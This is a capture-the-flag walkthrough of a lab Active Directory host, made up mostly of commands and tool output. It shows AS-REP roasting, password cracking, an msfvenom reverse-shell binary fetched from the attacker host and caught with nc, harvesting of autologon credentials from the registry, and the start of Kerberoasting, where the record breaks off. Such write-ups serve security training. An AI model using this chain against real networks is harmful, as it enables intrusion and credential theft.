
An initial scan revealed the following information about running services on the target server.

```
nmap -A -p- --min-rate 10000 10.129.59.252                
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 08:01 -0500
Nmap scan report for 10.129.59.252
Host is up (0.018s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-28 20:01:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-01-28T20:02:54
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   15.54 ms 10.10.14.1
2   15.67 ms 10.129.59.252

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.61 seconds
```

We enumerated an domain called "EGOTISTICAL-BANK.LOCAL" through LDAP. Let's map it to our target ip in our local dns file /etc/hosts.

```
echo "10.129.59.252 EGOTISTICAL-BANK.LOCAL" | tee -a /etc/hosts
```

Let's start with enumerating kerberos.

Retrieved 3 potential usernames.

```
./kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.59.252 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/28/26 - Ronnie Flathers @ropnop

2026/01/28 08:27:23 >  Using KDC(s):
2026/01/28 08:27:23 >   10.129.59.252:88

2026/01/28 08:27:24 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2026/01/28 08:27:26 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2026/01/28 08:27:28 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
```

Enumerated LDAP and retrieved root domain name. dn: DC=EGOTISTICAL-BANK,DC=LOCAL

```
nmap -n -Pn -sV --script "ldap* and not brute" 10.129.59.252
```

Enumerated LDAP with ldapsearch, but didn't find anything.

```
ldapsearch -v -x -b "DC=EGOTISTICAL-BANK,DC=LOCAL" -H "ldap://10.129.59.252" "(objectclass=*)"
ldap_initialize( ldap://10.129.59.252:389/??base )
filter: (objectclass=*)
requesting: All userApplication attributes
# extended LDIF
#
# LDAPv3
# base <DC=EGOTISTICAL-BANK,DC=LOCAL> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# EGOTISTICAL-BANK.LOCAL
dn: DC=EGOTISTICAL-BANK,DC=LOCAL
objectClass: top
objectClass: domain
objectClass: domainDNS
distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
instanceType: 5
whenCreated: 20200123054425.0Z
whenChanged: 20260128200019.0Z
subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
uSNCreated: 4099
dSASignature:: AQAAACgAAAAAAAAAAAAAAAAAAAAAAAAAQL7gs8Yl7ESyuZ/4XESy7A==
uSNChanged: 102433
name: EGOTISTICAL-BANK
objectGUID:: 7AZOUMEioUOTwM9IB/gzYw==
replUpToDateVector:: AgAAAAAAAAAHAAAAAAAAAJqTZgKeNkBJlc4LFr+H0BYXkAEAAAAAANH7i
 h8DAAAARsb/VEiFdUq/CcLUBWrijxaAAQAAAAAAHHgPFwMAAACrjO940UmFRLLC7Zxl/q+tDOAAAA
 AAAAAoOP4WAwAAANzRVIHxYS5CtEQKQAnmhHUVcAEAAAAAANRuDxcDAAAA/VqFkkbeXkGqVm5qQCP
 2DAvQAAAAAAAA0PAKFQMAAACb8MWfbB18RYsV+i8aPhNOFGABAAAAAAAQ1QAXAwAAAEC+4LPGJexE
 srmf+FxEsuwJsAAAAAAAANQEUhQDAAAA
creationTime: 134141040195722025
forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 0
maxPwdAge: -36288000000000
minPwdAge: -864000000000
minPwdLength: 7
modifiedCountAtLastProm: 0
nextRid: 1000
pwdProperties: 1
pwdHistoryLength: 24
objectSid:: AQQAAAAAAAUVAAAA+o7VsIowlbg+rLZG
serverState: 1
uASCompat: 1
modifiedCount: 1
auditingPolicy:: AAE=
nTMixedDomain: 0
rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name
 ,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
systemFlags: -1946157056
wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOT
 ISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Progra
 m Data,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrin
 cipals,DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=
 EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=E
 GOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGO
 TISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTIC
 AL-BANK,DC=LOCAL
wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,
 DC=EGOTISTICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICA
 L-BANK,DC=LOCAL
objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,D
 C=LOCAL
isCriticalSystemObject: TRUE
gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=Syste
 m,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
dSCorePropagationData: 16010101000000.0Z
otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTIS
 TICAL-BANK,DC=LOCAL
otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Servic
 e Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN
 =Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
ms-DS-MachineAccountQuota: 10
msDS-Behavior-Version: 7
msDS-PerUserTrustQuota: 1
msDS-AllUsersTrustQuota: 1000
msDS-PerUserTrustTombstonesQuota: 10
msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Na
 me,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-N
 ame,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
msDS-NcType: 0
msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
dc: EGOTISTICAL-BANK

# Users, EGOTISTICAL-BANK.LOCAL
dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL

# Computers, EGOTISTICAL-BANK.LOCAL
dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL

# Domain Controllers, EGOTISTICAL-BANK.LOCAL
dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL

# System, EGOTISTICAL-BANK.LOCAL
dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL

# LostAndFound, EGOTISTICAL-BANK.LOCAL
dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL

# Infrastructure, EGOTISTICAL-BANK.LOCAL
dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL

# ForeignSecurityPrincipals, EGOTISTICAL-BANK.LOCAL
dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL

# Program Data, EGOTISTICAL-BANK.LOCAL
dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL

# NTDS Quotas, EGOTISTICAL-BANK.LOCAL
dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL

# Managed Service Accounts, EGOTISTICAL-BANK.LOCAL
dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL

# Keys, EGOTISTICAL-BANK.LOCAL
dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL

# TPM Devices, EGOTISTICAL-BANK.LOCAL
dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL

# Builtin, EGOTISTICAL-BANK.LOCAL
dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL

# Hugo Smith, EGOTISTICAL-BANK.LOCAL
dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL

# search reference
ref: ldap://ForestDnsZones.EGOTISTICAL-BANK.LOCAL/DC=ForestDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://DomainDnsZones.EGOTISTICAL-BANK.LOCAL/DC=DomainDnsZones,DC=EGOTIST
 ICAL-BANK,DC=LOCAL

# search reference
ref: ldap://EGOTISTICAL-BANK.LOCAL/CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOC
 AL

# search result
search: 2
result: 0 Success

# numResponses: 19
# numEntries: 15
# numReferences: 3
```

Tried to enumerate SMB Shares anonymously, but didn't work.

```
smbclient -L \\\\10.129.59.252               
Password for [WORKGROUP\root]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.59.252 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Trying to login into SMB with same username and password of the users we retrieved earlier, but this also didn't work.

```
nxc smb 10.129.59.252 -u users -p users              
SMB         10.129.59.252   445    SAUNA            [*] Windows 10 / Server 2019 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hsmith:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:administrator STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\administrator:hsmith STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hsmith:hsmith STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:hsmith STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\administrator:fsmith STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\hsmith:fsmith STATUS_LOGON_FAILURE 
SMB         10.129.59.252   445    SAUNA            [-] EGOTISTICAL-BANK.LOCAL\fsmith:fsmith STATUS_LOGON_FAILURE
```

Tried to enumerate rpc anonymously, but also didn't workout.

```
rpcclient -U "" -N 10.129.59.252                          
rpcclient $> querydispinfo
result was NT_STATUS_ACCESS_DENIED
```

I'm pretty sure the initial attack vector will be the running webpage, let's get it!

Enumerated endpoints, file extensions & subdomains with gobuster, feroxbuster & ffuf.

```
feroxbuster -u http://10.129.59.252
[####################] - 62s   270044/270044  0s      found:37      errors:204    
[####################] - 60s    30000/30000   504/s   http://10.129.59.252/ 
[####################] - 61s    30000/30000   494/s   http://10.129.59.252/images/ 
[####################] - 58s    30000/30000   516/s   http://10.129.59.252/css/ 
[####################] - 60s    30000/30000   497/s   http://10.129.59.252/Images/ 
[####################] - 60s    30000/30000   497/s   http://10.129.59.252/fonts/ 
[####################] - 60s    30000/30000   498/s   http://10.129.59.252/CSS/ 
[####################] - 60s    30000/30000   497/s   http://10.129.59.252/Css/ 
[####################] - 60s    30000/30000   500/s   http://10.129.59.252/IMAGES/ 
[####################] - 58s    30000/30000   516/s   http://10.129.59.252/Fonts/
```

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://EGOTISTICAL-BANK.LOCAL -H "Host: FUZZ.EGOTISTICAL-BANK.LOCAL" -fs 32797

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://EGOTISTICAL-BANK.LOCAL
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.EGOTISTICAL-BANK.LOCAL
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 32797
________________________________________________

:: Progress: [100000/100000] :: Job [1/1] :: 662 req/sec :: Duration: [0:01:29] :: Errors: 0 ::
```





```
gobuster dir -u http://10.129.59.252 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.59.252
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://10.129.59.252/images/]
/Images               (Status: 301) [Size: 151] [--> http://10.129.59.252/Images/]
/css                  (Status: 301) [Size: 148] [--> http://10.129.59.252/css/]
/fonts                (Status: 301) [Size: 150] [--> http://10.129.59.252/fonts/]
/IMAGES               (Status: 301) [Size: 151] [--> http://10.129.59.252/IMAGES/]
/Fonts                (Status: 301) [Size: 150] [--> http://10.129.59.252/Fonts/]
/CSS                  (Status: 301) [Size: 148] [--> http://10.129.59.252/CSS/]
```



```
 gobuster dir -u http://EGOTISTICAL-BANK.LOCAL -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docs,aspx,asp 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://EGOTISTICAL-BANK.LOCAL
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              aspx,asp,txt,php,html,zip,json,docs
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about.html           (Status: 200) [Size: 30954]
/About.html           (Status: 200) [Size: 30954]
/blog.html            (Status: 200) [Size: 24695]
/Blog.html            (Status: 200) [Size: 24695]
/contact.html         (Status: 200) [Size: 15634]
/Contact.html         (Status: 200) [Size: 15634]
/css                  (Status: 301) [Size: 157] [--> http://EGOTISTICAL-BANK.LOCAL/css/]
/fonts                (Status: 301) [Size: 159] [--> http://EGOTISTICAL-BANK.LOCAL/fonts/]
/images               (Status: 301) [Size: 160] [--> http://EGOTISTICAL-BANK.LOCAL/images/]
/Images               (Status: 301) [Size: 160] [--> http://EGOTISTICAL-BANK.LOCAL/Images/]
/index.html           (Status: 200) [Size: 32797]
/Index.html           (Status: 200) [Size: 32797]
/index.html           (Status: 200) [Size: 32797]
/single.html          (Status: 200) [Size: 38059]
Progress: 41517 / 41517 (100.00%)
```

Unfortunately there was no interesting endpoint --> besides single.html.

Analyzing the source code and the logic of the page itself, there seems to be only misconfiguration/flaw. Which prompts an 405 server response. Apparently HTTP verb used to acces this page is not allowed, although I only prompt my email.
Upon inspecting the network package in burpsuite, we realise that this seems to be making an POST Request although, trying GET instead prompts us with an 200 server response. But no sensitive information retrieved.

But this also didn't provide any information. Since we got a pair of usernames, let's use them to perform ASREP-Roasting, maybe some of the users doesn't require pre-authentication. It worked! we gained an TGT Ticket Hash.

```
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users -dc-ip 10.129.59.252 

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a7dbbdf773dab0cd6f235bbc20746cb9$a625b803df85ed4b31148ec5fb8868a5f1fe8868e57e567f42f6847544ce62fc456556c87a693671d9b42308c2c8bc86fcdc4cd3b9bccb3264a2eb305cec927e23e8a9422c0cd0c72bd4f9157a6d37f6ad6fb8bfe3524c5de09d433b27e3abd3393dd3b735e0785bac445680793cb0f362aa9ae4af7d29aa72b6aca16d885421c4843b8f6b0e290ccdf1d2f62ddf93fe737f6fdcf05b8a4f00560456011aaf93cf7943fd958bfe4af4d7e95b651be0146797f8ded9f95627363462944e8ff5ada0401c2d00651cb875aa48861befb2af7901a1328118bf720e6b127fbe1d91c4849e1f22bfc17cfe7ac0e85ce61f026161a901dfb7d390d40de90ade37873ddd
```

Saved the hash locally and bruteforced it utilizing john the ripper.

```
john fsmith.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)     
1g 0:00:01:17 DONE (2026-01-28 09:03) 0.01284g/s 135410p/s 135410c/s 135410C/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Gained Credentials.

```
fsmith:Thestrokes23
```

Gained RCE as user "fsmith" through evil-winrm.

```
evil-winrm -i 10.129.59.252 -u fsmith -p Thestrokes23                          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

Retrieved user.txt in C:\Users\FSmith\Desktop.

```
6c099832968620bf1f4469fb7acae39f
```

I checked privileges of our current user, but couldn't find anything interesting.

```
*Evil-WinRM* PS C:\Users\FSmith\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Decided to check bloodhound.

1. Downloaded ALL domain information.

```
 bloodhound-python -u "fsmith" -p 'Thestrokes23' -ns 10.129.59.252 -d EGOTISTICAL-BANK.LOCAL -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (SAUNA.EGOTISTICAL-BANK.LOCAL:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::1da8:f9f3:3fc3:3ebf
INFO: Trying LDAP connection to dead:beef::1da8:f9f3:3fc3:3ebf
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Testing resolved hostname connectivity dead:beef::1da8:f9f3:3fc3:3ebf
INFO: Trying LDAP connection to dead:beef::1da8:f9f3:3fc3:3ebf
INFO: Found 7 users
INFO: Found 52 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done in 00M 07S
```

2. Started up bloodhound

```
neo4j console
bloodhound
```

3. Tried to find an escalation path, but I didn't find anything. There seemed to be no exploitable windows permissions. I'm assuming we'll need to exploit this lab in another way.

Created an reverse shell binary.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=88 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
```

Downloaded it onto target server.

```
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.15.150/shell.exe -OutFile shell.exe
```

Started up listener on local machine.

```
rlwrap nc -lvnp 88
```

Executed binary and gained RCE as user "egotisticalbank\fsmith".

```
rlwrap nc -lvnp 88        
listening on [any] 88 ...
connect to [10.10.15.150] from (UNKNOWN) [10.129.59.252] 49941
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Temp>
```

Decided to download winPEAS onto the target system, due to manually enumerating was highly restricted for example we had no access to "systeminfo". Couldn't find anything interesting.

Decided to move back and enumerate SMB Shares authenticated!

```
smbclient -L \\\\10.129.59.252 -U fsmith     
Password for [WORKGROUP\fsmith]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        print$          Disk      Printer Drivers
        RICOH Aficio SP 8300DN PCL 6 Printer   We cant print money
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.59.252 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Enumerated AutoLogon Credentials on the target server for user "svc_loanmgr".

```
C:\>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x8c9319f7
    ShutdownFlags    REG_DWORD    0x8000022b
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

Retrieved Credentials

```
svc_loanmgr:Moneymakestheworldgoround!
```

Since we got credentials for an service account, let's perform Kerberoasting!

This didn't work out, due to the DC of the target not having the same time as our current machine, which is against the internal policies, so we'll have to match our time.

1. Stop the auto time sync

```
timedatectl set-ntp off
```

2. Sync up with target

```
rdate -n 10.129.59.252          
Wed Jan 28 18:52:19 EST 2026
```

Performed Kerberoasting and gained TGT Ticket of user "HSmith".

```
impacket-GetUserSPNs -request EGOTISTICAL-BANK.LOCAL/svc_loanmgr
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName                      Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------------------  ------  --------  --------------------------  ---------  ----------
SAUNA/HSmith.EGOTISTICALBANK.LOCAL:60111  HSmith            2020-01-23 00:54:34.140321  <never>               



[-] CCache file is not found. Skipping...
